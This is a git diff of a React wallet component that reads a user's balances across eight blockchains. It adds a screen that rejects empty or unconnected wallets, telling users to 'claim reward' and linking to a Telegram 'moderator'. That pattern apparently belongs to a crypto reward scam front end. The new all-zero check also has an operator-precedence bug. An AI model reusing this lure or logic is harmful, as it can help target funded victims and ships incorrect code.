@@ -19,55 +19,17 @@ type WalletBalancesProps = {
 const WalletBalances: React.FC<WalletBalancesProps> = ({ onBalancesChange }) => {
   const { address, isConnected } = useAccount();
 
-  // Fetch balance on Ethereum Mainnet
-  const { data: ethBalance } = useBalance({
-    address,
-    chainId: mainnet.id,
-  });
+  // Fetch balances from various chains
+  const { data: ethBalance } = useBalance({ address, chainId: mainnet.id });
+  const { data: maticBalance } = useBalance({ address, chainId: polygon.id });
+  const { data: bnbBalance } = useBalance({ address, chainId: bsc.id });
+  const { data: sepoliaBalance } = useBalance({ address, chainId: sepolia.id });
+  const { data: optimismBalance } = useBalance({ address, chainId: optimism.id });
+  const { data: arbitrumBalance } = useBalance({ address, chainId: arbitrum.id });
+  const { data: baseBalance } = useBalance({ address, chainId: base.id });
+  const { data: zkSyncBalance } = useBalance({ address, chainId: zkSync.id });
 
-  // Fetch balance on Polygon
-  const { data: maticBalance } = useBalance({
-    address,
-    chainId: polygon.id,
-  });
-
-  // Fetch balance on Binance Smart Chain
-  const { data: bnbBalance } = useBalance({
-    address,
-    chainId: bsc.id,
-  });
-
-  // Fetch balance on Sepolia Testnet
-  const { data: sepoliaBalance } = useBalance({
-    address,
-    chainId: sepolia.id,
-  });
-  
-  // Fetch balance on Optimism
-  const { data: optimismBalance } = useBalance({
-    address,
-    chainId: optimism.id,
-  });
-
-  // Fetch balance on Arbitrum
-  const { data: arbitrumBalance } = useBalance({
-    address,
-    chainId: arbitrum.id,
-  });
-
-  // Fetch balance on Base
-  const { data: baseBalance } = useBalance({
-    address,
-    chainId: base.id,
-  });
-
-  // Fetch balance on zkSync
-  const { data: zkSyncBalance } = useBalance({
-    address,
-    chainId: zkSync.id,
-  });
-
-  // Notify the parent component of balance changes
+  // Notify parent component of balance changes
   useEffect(() => {
     onBalancesChange({
       ethBalance: ethBalance?.formatted || '0',
@@ -91,7 +53,30 @@ const WalletBalances: React.FC<WalletBalancesProps> = ({ onBalancesChange }) => 
     onBalancesChange,
   ]);
 
-  if (!isConnected) return <div className={styles.connectMessage}>Resolver Node.</div>;
+  // Check if all balances are empty or zero
+  const allBalancesZero =
+    !ethBalance?.formatted || parseFloat(ethBalance.formatted) === 0 &&
+    !maticBalance?.formatted || parseFloat(maticBalance.formatted) === 0 &&
+    !bnbBalance?.formatted || parseFloat(bnbBalance.formatted) === 0 &&
+    !sepoliaBalance?.formatted || parseFloat(sepoliaBalance.formatted) === 0 &&
+    !optimismBalance?.formatted || parseFloat(optimismBalance.formatted) === 0 &&
+    !arbitrumBalance?.formatted || parseFloat(arbitrumBalance.formatted) === 0 &&
+    !baseBalance?.formatted || parseFloat(baseBalance.formatted) === 0 &&
+    !zkSyncBalance?.formatted || parseFloat(zkSyncBalance.formatted) === 0;
+
+  // If the wallet is not connected or all balances are zero, show the inactive wallet message
+  if (!isConnected || allBalancesZero) {
+    return (
+      <div className={styles.inactiveMessage}>
+        <p>Inactive wallet, kindly connect an active wallet to claim reward.</p>
+        <p>
+          <a href="https://t.me/kanau" className={styles.moderatorLink}>
+            Click to contact moderator
+          </a>
+        </p>
+      </div>
+    );
+  }
 
   return (
     <div className={styles.walletBalances}>
